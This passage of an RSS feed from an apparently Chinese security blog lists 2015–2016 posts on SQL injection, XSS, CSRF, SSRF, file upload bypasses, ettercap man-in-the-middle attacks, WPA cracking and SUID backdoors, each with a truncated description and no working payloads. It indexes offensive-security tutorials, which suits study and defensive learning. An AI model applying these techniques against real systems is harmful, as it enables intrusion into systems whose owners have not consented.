      <description>0x00 逻辑漏洞 逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。 这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。 0x01 密</description>
    </item>
    <item>
      <title>敏感信息泄露</title>
      <link>https://wyb0.com/posts/2016/sensitive-information-leakage/</link>
      <pubDate>Thu, 28 Jul 2016 22:42:58 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/sensitive-information-leakage/</guid>
      <description>0x00 软件敏感信息 * 操作系统版本 可用namp扫描得知 * 中间件的类型、版本 http返回头 404报错页面 使用工具(如whatwe</description>
    </item>
    <item>
      <title>任意文件查看与下载漏洞</title>
      <link>https://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/</link>
      <pubDate>Wed, 27 Jul 2016 23:25:18 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/</guid>
      <description>0x00 漏洞介绍 一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够</description>
    </item>
    <item>
      <title>文件包含漏洞</title>
      <link>https://wyb0.com/posts/2016/file-include-vulnerabilities/</link>
      <pubDate>Tue, 26 Jul 2016 09:24:22 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/file-include-vulnerabilities/</guid>
      <description>环境：phpStudy 2016、DVWA v1.10 0x00 文件包含 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时</description>
    </item>
    <item>
      <title>代码执行漏洞(一)</title>
      <link>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 22:32:51 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</guid>
      <description>0x00 代码执行 当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造</description>
    </item>
    <item>
      <title>命令执行漏洞</title>
      <link>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</link>
      <pubDate>Sun, 24 Jul 2016 14:32:51 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</guid>
      <description>0x00 命令执行 应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、 passth</description>
    </item>
    <item>
      <title>文件上传之文本编辑器上传漏洞</title>
      <link>https://wyb0.com/posts/2016/file-upload-editor-upload-vulnerability/</link>
      <pubDate>Thu, 21 Jul 2016 15:11:29 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/file-upload-editor-upload-vulnerability/</guid>
      <description>0x00 文本编辑器 常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEdit</description>
    </item>
    <item>
      <title>文件上传漏洞常见绕过手法</title>
      <link>https://wyb0.com/posts/2016/file-upload-simple-to-bypass/</link>
      <pubDate>Wed, 20 Jul 2016 17:04:44 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/file-upload-simple-to-bypass/</guid>
      <description>0x00 一般防止上传漏洞手法 1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证 //任何客户端</description>
    </item>
    <item>
      <title>文件上传漏洞与文件解析漏洞</title>
      <link>https://wyb0.com/posts/2016/file-upload-and-file-parse-vuln/</link>
      <pubDate>Wed, 20 Jul 2016 11:30:53 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/file-upload-and-file-parse-vuln/</guid>
      <description>0x00 文件上传漏洞 当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的 脚本文件时，就有可能控</description>
    </item>
    <item>
      <title>一次存储型 XSS 利用实例</title>
      <link>https://wyb0.com/posts/2016/recording-an-stored-xss/</link>
      <pubDate>Sun, 17 Jul 2016 23:30:54 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/recording-an-stored-xss/</guid>
      <description>首先感谢凯神的指导 0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的</description>
    </item>
    <item>
      <title>XSS 漏洞及其挖掘方法</title>
      <link>https://wyb0.com/posts/2016/xss-basis-and-use/</link>
      <pubDate>Fri, 15 Jul 2016 10:30:54 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/xss-basis-and-use/</guid>
      <description>0x00 简介 XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器</description>
    </item>
    <item>
      <title>无线下 ettercap 做中间人攻击</title>
      <link>https://wyb0.com/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</link>
      <pubDate>Wed, 13 Jul 2016 09:22:39 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</guid>
      <description>前提：攻击主机和被攻击主机在一个无线下面 0x00 打开ettercap 0x01 查看host列表 在软件的图形化界面点击sniff，选择u</description>
    </item>
    <item>
      <title>攻击 WPA 保护下的 802.11 网络</title>
      <link>https://wyb0.com/posts/2016/attack-802.11-network-under-wpa-protection/</link>
      <pubDate>Wed, 13 Jul 2016 08:18:59 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/attack-802.11-network-under-wpa-protection/</guid>
      <description>0x00 网络拓扑及信息 其中 ip 等信息如下： 0x01 获取信息 查看无线网卡并将其设置为监听模式 打开 kismet，进行基本设置 选择名字为 111111 的</description>
    </item>
    <item>
      <title>SSRF</title>
      <link>https://wyb0.com/posts/2016/ssrf/</link>
      <pubDate>Thu, 30 Jun 2016 15:30:54 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/ssrf/</guid>
      <description>0x00 什么是SSRF SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，它将一个可以发</description>
    </item>
    <item>
      <title>sqlmapapi 的简单使用</title>
      <link>https://wyb0.com/posts/2016/sqlmapapi-usage/</link>
      <pubDate>Tue, 28 Jun 2016 11:19:11 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/sqlmapapi-usage/</guid>
      <description>0x00 关于sqlmapapi.py 当利用sqlmap时一次只能测试一个url，效率很低，而用sqlmapapi就可以实现批量</description>
    </item>
    <item>
      <title>CSRF 漏洞</title>
      <link>https://wyb0.com/posts/2016/csrf/</link>
      <pubDate>Tue, 28 Jun 2016 09:21:34 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/csrf/</guid>
      <description>0x00 概念 当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、删除文章等操作，</description>
    </item>
    <item>
      <title>SQL 注入之防御</title>
      <link>https://wyb0.com/posts/2016/injection-of-defense/</link>
      <pubDate>Sat, 25 Jun 2016 10:25:11 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/injection-of-defense/</guid>
      <description>0x00 要做的事 也就是找到注入点然后修复 0x01 防御方法 使用预编译语句绑定变量(比如php的mysqli、pdo) &amp;lt;?php //预编译 $mysqli = new</description>
    </item>
    <item>
      <title>SQL 注入之宽字节注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-wide-byte/</link>
      <pubDate>Fri, 24 Jun 2016 15:32:34 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/injection-of-wide-byte/</guid>
      <description>0x00 应用场景 在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quote</description>
    </item>
    <item>
      <title>SQL 注入之基于时间的注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-time-based/</link>
      <pubDate>Fri, 24 Jun 2016 10:10:27 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/injection-of-time-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。 其实只要存在S</description>
    </item>
    <item>
      <title>SQL 注入之布尔型注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-boolian-based/</link>
      <pubDate>Thu, 23 Jun 2016 23:32:34 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/injection-of-boolian-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位，且没有用echo &amp;#34;mysql_error()&amp;#34;输出错误信息时可以用</description>
    </item>
    <item>
      <title>SQL 注入之报错型注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-error-based/</link>
      <pubDate>Wed, 22 Jun 2016 15:30:54 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/injection-of-error-based/</guid>
      <description>0x00 前提 一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但</description>
    </item>
    <item>
      <title>SQL 注入之联合查询(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-union-select/</link>
      <pubDate>Tue, 21 Jun 2016 22:30:18 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/injection-of-union-select/</guid>
      <description>0x00 前提 要用联合查询进行注入则：页面必须有显示位 0x01 联合查询 union可合并两个或多个select语句的结果集，前提是两个s</description>
    </item>
    <item>
      <title>SQL 注入之 load_file 和 into outfile(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-mysql-function/</link>
      <pubDate>Mon, 20 Jun 2016 08:10:27 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/injection-of-mysql-function/</guid>
      <description>0x00 load_file() 读文件 条件: 1. 要有file_priv权限: show global variables like &amp;#39;%secure%&amp;#39;; 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若</description>
    </item>
    <item>
      <title>SQL 注入</title>
      <link>https://wyb0.com/posts/2016/injection/</link>
      <pubDate>Sun, 19 Jun 2016 20:18:48 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/injection/</guid>
      <description>0x00 含义 sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的</description>
    </item>
    <item>
      <title>使用 theHarvester 得到邮箱</title>
      <link>https://wyb0.com/posts/2016/theharvester-blasting-email/</link>
      <pubDate>Thu, 12 May 2016 15:27:14 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/theharvester-blasting-email/</guid>
      <description>0x00 软件 使用theHarvester搜集邮箱 使用dnsenum得到邮箱服务器域名 使用nmap查看端口开启情况 使用Hydra</description>
    </item>
    <item>
      <title>Nmap思维导图</title>
      <link>https://wyb0.com/posts/2016/nmap-mind-mapping/</link>
      <pubDate>Tue, 10 May 2016 20:24:07 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/nmap-mind-mapping/</guid>
      <description>nmap思维导图如下：</description>
    </item>
    <item>
      <title>利用 EtterCap 进行中间人攻击</title>
      <link>https://wyb0.com/posts/2016/linux-install-ettercap/</link>
      <pubDate>Tue, 19 Apr 2016 00:00:00 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/linux-install-ettercap/</guid>
      <description>0x00 准备 操作系统：CentOS 首先，ettercap 安装时需要 4 个依赖包，而且安装包里面也已经提供了 执行：sudo yum groupinstall &amp;#34;Development tools&amp;#34;</description>
    </item>
    <item>
      <title>Linux 之 SUID 后门</title>
      <link>https://wyb0.com/posts/2016/linux-suid-back-door/</link>
      <pubDate>Mon, 18 Apr 2016 20:03:07 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/linux-suid-back-door/</guid>
      <description>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制 0x00 为二进制文件添加s权限从而提升为</description>
    </item>
    <item>
      <title>ASP Cookie 处联合注入</title>
      <link>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</link>
      <pubDate>Fri, 04 Dec 2015 19:42:19 +0000</pubDate>
      <guid>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</guid>
      <description>0x00 Cookie注入的使用 三大Web提交方式 GET：直接在浏览器上面访问地址 POST：提交表单(会员注册、文件上传等) CO</description>
    </item>
  </channel>
</rss>
